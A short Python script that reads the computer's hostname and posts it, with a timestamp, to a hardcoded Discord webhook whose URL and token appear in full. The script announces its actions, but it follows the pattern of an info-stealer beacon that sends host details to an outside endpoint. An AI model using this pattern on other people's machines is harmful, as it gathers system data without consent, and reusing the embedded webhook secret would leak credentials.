import os
import json
import requests
from datetime import datetime


WEBHOOK_URL = "https://discord.com/api/webhooks/1496243116909264979/frxTfE-oeKkWOiYHnflcMNxF0QlD4bLkgs-PBEE8Qe5-9tMfTMfwlgJUYDa9dLbAWT7f"

def webhook(url: str, c_name: str, payload_color: int = 0x00ff00)-> bool:


    payload = {
        "avatar_url": "https://i.pinimg.com/1200x/11/f0/ef/11f0ef7ebeb695ec6ba595dbe2eef4ba.jpg",

        "embeds":[{
            "title": "Computer Name Found".capitalize(),
            "description": f"Computer Name: {c_name} \n\nTimestamp: {datetime.now().isoformat()}",
            "color": payload_color}]
    }

    try:
        response = requests.post(url, json=payload, timeout=10)
        print(f"Sent computer name. Status Code: {response.status_code}")
        if response.status_code == 200:
            return True
        else:
            print(f"[WARN] Webhook returned non-200 status: {response.text[:50]}")
    except Exception as e:
        print(f"[WARN] Error sending webhook: {e}")
        return False


def computer_name():
    try:
        c_name = os.getenv('COMPUTERNAME') or os.getenv('HOSTNAME') or "Unknown"
        print(f"Computer name: {c_name}")
        return c_name
    except Exception as e:
        print(f"[WARN] Error retrieving computer name: {e}")
        return "Unknown"

def main():
    payload_color = 0x00ff00


    print("--- Sending Computer Name to Webhook ---")
    c_name = computer_name()

    if c_name == "Unknown":
        payload_color = 0xff0000
    


    print("Computer name found... Sending to webhook...")
    webhook(WEBHOOK_URL, c_name)

if __name__ == "__main__":
    main()
